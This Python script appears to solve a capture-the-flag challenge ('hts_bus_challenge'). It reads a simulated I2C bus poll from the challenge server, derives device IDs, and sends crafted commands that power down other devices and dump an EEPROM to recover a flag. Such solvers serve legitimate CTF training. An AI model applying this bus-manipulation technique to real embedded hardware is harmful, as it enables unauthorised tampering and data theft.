#!/usr/bin/env python3

import os,sys
from threading  import Thread
from queue import Queue, Empty
import time
import socket, errno
import re

ON_POSIX = 'posix' in sys.builtin_module_names
done=False
tstart = time.time()

print('\n*** SOLVING: hts_bus_challenge -')

# as we get chunks of output bytes from the challenge, we convert to 
# strings and enqueue it for the mainloop.
# if there is a >1 sec pause in the output, we enqueue a single None 
# instead so the mainloop knows we're in a pause.

def enqueue_output(out, queue):
    global done, tstart
    #fd = out.fileno()
    #fl = fcntl.fcntl(fd, fcntl.F_GETFL)
    #fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
    didpause=False
    ts=time.time()-tstart
    while True:
        try:
            stuff = out.recv(64)
        except socket.error as e:
            if e.errno != errno.EAGAIN:
                raise e
            
            pts=time.time()-tstart
            if (pts-ts > 1.0) and not didpause:
                queue.put(b"")
                didpause=True
            time.sleep(0.05)
        
        else:
            didpause=False    
            if stuff == b'':
                break
            ts=time.time()-tstart
            queue.put(stuff.decode("utf-8"))
    out.close()
    done=True

if __name__ == "__main__":
    '''
    try:
        p = Popen(['bin/hts_bus_challenge'], stdout=PIPE, stdin=PIPE, bufsize=1, close_fds=ON_POSIX)
    except Exception as e:
        print("FAIL: Couldn't Popen bin/hts_bus_challenge : {}".format(e))
    exit(-1)
    '''
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", 31360))
    Ticket = os.getenv("TICKET","")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((Host, Port))
    
    if len(Ticket):
        sock.recv(128)
        sock.send( (Ticket + "\n").encode("utf-8") )
    
    sock.setblocking(0)
    
    q = Queue()
    t = Thread(target=enqueue_output, args=(sock, q))
    t.daemon = True # thread dies with the program
    t.start()

    machine_state=0 # initially, we just want to gather the text of a full poll of the bus- up to the first pause
    pollstring=""
    eps_id=0
    eep_enable_bit = 0
    eep_id = 0 
    eep_string="" # eep dump gathers here
    found_needle=False
    oct_buf = ''
    eep_text=b''
    exfil = ''
    while not done:
        try:
            ch = q.get(timeout=.1) #q.get_nowait() # or q.get(timeout=.1)

            if machine_state==0:
                print(ch,end='',flush=True)

                if ch is b"": # OBC finsihed initial round of bus polling and we're in a pause.

                    # parse the poll string

                    s=pollstring.find('^')
                    pollstring=pollstring[s:]
                    # ^3c+00+00+3e+00+00+00+
                    eps_id = int(pollstring[1:3],16)
                    eps_flags = int(pollstring[10:12],16)
                    eep_enable_bit = 0x3f-eps_flags 
                    toks = pollstring.split('^')
                    eep_id = int(toks[4][0:2],16)
                    output="^{:02x}0000{:02x}.^{:02x}0000".format(eps_id+1,eep_enable_bit,eep_id)
                    output = output.encode('utf-8')
                    print('\r\n\r\n* WISDOMS GAINED:\r\n',end='')
                    print('    EPS I2C ID         : 0x{:02x}\r\n'.format(eps_id),end='')
                    print('    EPS EEP ENABLE BIT : 0x{:02x}\r\n'.format(eep_enable_bit),end='')
                    print('    EEP I2C ID         : 0x{:02x}\r\n'.format(eep_id),end='')
                    print('    REQUIRED COMMANDS  : {}\r\n\r\n'.format(output),end='') 
                    
                    # issue the I2C transactions to power off everything but the EEP,
                    # and to start dumping the EEP.

                    sock.sendall(output)
                    needle='^{:02x}+00+00+'.format(eep_id)
                    machine_state=1
                else:
                    pollstring+=ch

            elif machine_state==1: # we're dumping the EEP
                
                if ch is not b"":
                    eep_string+=ch
                    if not found_needle:
                        if needle in eep_string:
                            i = eep_string.find(needle)
                            eep_string=eep_string[i+len(needle):]
                        found_needle=True
                        print("* EEP DUMP:\r\n\r\n",end='')
                    else:
                        if len(eep_string)>=1:
                            for c in eep_string:
                                if c in '0123456789abcdefABCDEF':
                                    oct_buf+=c
                                    if len(oct_buf)==2:
                                        o=int(oct_buf,16)
                                        if (o>=32) and (o<=126):
                                            print("{:c}".format(o),end='',flush=True);
                                            exfil += "{:c}".format(o)
                                            
                                        else:
                                            print(".",end='',flush=True)
                                            exfil += "."
                                        oct_buf=''
                            eep_string=''
                    if '-' in ch:
                        break
                    else:
                        sock.send(b'00')
        except Empty:       
            pass

    print('\r\n\r\n') 
    m = re.match('.*(flag{.+?}).*', exfil)
    if m is not None:
        print(m.group(1)) 
    else:
        print("Didn't find flag")
    print('\r\n\r\nDONE.\r\n\r\n')
